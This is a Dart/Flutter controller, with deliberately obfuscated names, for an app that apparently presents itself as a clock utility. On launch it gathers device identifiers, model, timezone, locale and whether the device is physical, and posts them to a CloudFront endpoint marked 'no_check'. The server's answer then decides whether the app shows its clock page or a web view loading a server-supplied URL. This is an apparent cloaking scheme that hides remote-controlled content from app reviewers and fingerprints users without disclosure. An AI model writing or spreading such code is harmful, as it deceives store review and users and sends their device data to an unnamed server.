import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class PourRichEndLogic extends GetxController {

  var fazbxn = RxBool(false);
  var hegbjvf = RxBool(true);
  var tmkxzdhj = RxString("");
  var fvhqwe = RxBool(false);
  var bejrlqwm = RxBool(true);
  final uplfawio = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    xifkz();
  }


  Future<void> xifkz() async {
    fvhqwe.value = true;
    bejrlqwm.value = true;
    hegbjvf.value = false;

    uplfawio.post("https://d2gjygpr88ln24.cloudfront.net/FBRKK6?no_check",data: await hmefxibwyn()).then((value) {
      var fjvqsyi = value.data["fjvqsyi"] as String;
      var vdunb = value.data["vdunb"] as bool;
      if (vdunb) {
        tmkxzdhj.value = fjvqsyi;
        sljae();
      } else {
        cfglnj();
      }
    }).catchError((e) {
      hegbjvf.value = true;
      bejrlqwm.value = true;
      fvhqwe.value = false;
    });
  }

  Future<Map<String, dynamic>> hmefxibwyn() async {
    final DeviceInfoPlugin wdph = DeviceInfoPlugin();
    PackageInfo uzxo_swqtxpkn = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var bmjfoacx = Platform.localeName;
    var zlsix_AL = currentTimeZone;

    var zlsix_FgCjWd = uzxo_swqtxpkn.packageName;
    var zlsix_FWfYKZI = uzxo_swqtxpkn.version;
    var zlsix_Txdhl = uzxo_swqtxpkn.buildNumber;

    var zlsix_vxL = uzxo_swqtxpkn.appName;
    var zlsix_io = "";
    var zlsix_epdRv  = "";
    var zlsix_sAJ = "";
    var qayknbjx = "";
    var vwqtg = "";
    var urodhy = "";
    var iwsmdr = "";
    var ysthq = "";
    var ivymxbq = "";
    var beiyrvf = "";


    var zlsix_PHKlcv = "";
    var zlsix_VEre = false;

    if (GetPlatform.isAndroid) {
      zlsix_PHKlcv = "android";
      var bnxizoc = await wdph.androidInfo;

      zlsix_sAJ = bnxizoc.brand;

      zlsix_io  = bnxizoc.model;
      zlsix_epdRv = bnxizoc.id;

      zlsix_VEre = bnxizoc.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      zlsix_PHKlcv = "ios";
      var qjnpiex = await wdph.iosInfo;
      zlsix_sAJ = qjnpiex.name;
      zlsix_io = qjnpiex.model;

      zlsix_epdRv = qjnpiex.identifierForVendor ?? "";
      zlsix_VEre  = qjnpiex.isPhysicalDevice;
    }

    var res = {
      "zlsix_vxL": zlsix_vxL,
      "ysthq" : ysthq,
      "zlsix_Txdhl": zlsix_Txdhl,
      "zlsix_FWfYKZI": zlsix_FWfYKZI,
      "zlsix_io": zlsix_io,
      "iwsmdr" : iwsmdr,
      "zlsix_AL": zlsix_AL,
      "zlsix_sAJ": zlsix_sAJ,
      "zlsix_epdRv": zlsix_epdRv,
      "bmjfoacx": bmjfoacx,
      "zlsix_PHKlcv": zlsix_PHKlcv,
      "zlsix_VEre": zlsix_VEre,
      "qayknbjx" : qayknbjx,
      "zlsix_FgCjWd": zlsix_FgCjWd,
      "vwqtg" : vwqtg,
      "urodhy" : urodhy,
      "ivymxbq" : ivymxbq,
      "beiyrvf" : beiyrvf,

    };
    return res;
  }

  Future<void> cfglnj() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> sljae() async {
    Get.offNamed("/Outreload");
  }

}
